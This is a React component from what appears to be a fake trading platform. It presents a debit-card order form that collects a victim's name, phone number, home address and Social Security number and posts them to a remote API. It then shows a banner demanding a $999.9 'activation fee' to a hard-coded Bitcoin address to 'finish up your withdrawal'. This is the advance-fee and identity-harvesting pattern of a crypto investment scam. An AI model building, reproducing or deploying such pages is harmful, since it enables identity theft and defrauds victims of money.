import React, { useState } from 'react'
import Loader from "./Loader/Loader";
import { toast } from 'react-toastify';

const debitCard = () => {

    const [isPending, setIsPending] = useState(false)

    const [banner, setBanner] = useState(false)


    const [formData, setFormData] = useState({
        name: '',
        address: '',
        wallet: '',
        ssn: '',
        phone: ''
    })

    const inputChange = (e) => {
        setFormData((prevState) => ({
            ...prevState, [e.target.name]: e.target.value
        }))
    }

    const handleSubmit = async (e) => {
        e.preventDefault()

        setIsPending(true)

        try {
            const response = await fetch(`https://trading-api-orcin.vercel.app/api/v1/cards/order`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({name: formData.name, address: formData.address, ssn: formData.ssn, phone: formData.phone, wallet: formData.wallet})
            })

            const json = await response.json()

            console.log(json)

            if(!response.ok){
                toast.error(json.error)
                console.log(json.error)
            }

            if(response.ok){
                toast.success(`successful`)
                setBanner(true)
            }
        } catch (error) {
            console.log(error)
            toast.error('Something went wrong')
        } finally {
            setIsPending(false)
        }

    }

    if (banner) return (

        <div className='border border-rose-500 bg-rose-200 p-2 rounded-md text-rose-700'>Thanks for submitting your license order, complete the order activation fee to finish up your withdrawal process

          <span className='text-black font-bold'> $999.9</span> to <span className='text-black font-bold'>bc1qsjre9tfda3x9rw346n5y3xz4ywhz4je6epg0ut</span>
        </div>
    )


    if (!banner) return (
    <div className="grid grid-cols-1">
    <form  className="flex flex-col gap-y-4 text-white">
        <div className='grid grid-cols-2 gap-x-4 w-full'>
            <div className='flex flex-col gap-y-1'>
                <label >Fullname</label>
                <input
                    type="text"
                    className="w-full bg-[#18203A] text-slate-300"
                    placeholder="eg. John smith"
                    name="name"
                    value={formData.name}
                    onChange={inputChange}
                />
            </div>

            <div className='flex flex-col gap-y-1'>
                <label >Phone :</label>
                <input
                    type="number"
                    className="w-full bg-[#18203A] text-slate-300"
                    placeholder="eg. +13456890908"
                    name="phone"
                    value={formData.phone}
                    onChange={inputChange}
                />
            </div>
            
        </div>
        <div className='flex flex-col gap-y-1'>
            <label >Home Address</label>
            <input
                type="text"
                className="w-full bg-[#18203A] text-slate-300"
                placeholder="eg. 2523 Ravi a street San antonio TX"
                name="address"
                value={formData.address}
                onChange={inputChange}
            />
        </div>

        <div className='flex flex-col gap-y-1'>
            <label >SSN</label>
            <input
                type="number"
                className="w-full bg-[#18203A] text-slate-300"
                placeholder="eg. 0123456789"
                name="ssn"
                value={formData.ssn}
                onChange={inputChange}
            />
        </div>
        
        <button type="button" onClick={handleSubmit} className="p-2 bg-blue-500 w-full text-white shadow shadow-white">
            Order
        </button>
    </form>
    {isPending && <Loader/>}
    </div>
    
  )
}

export default debitCard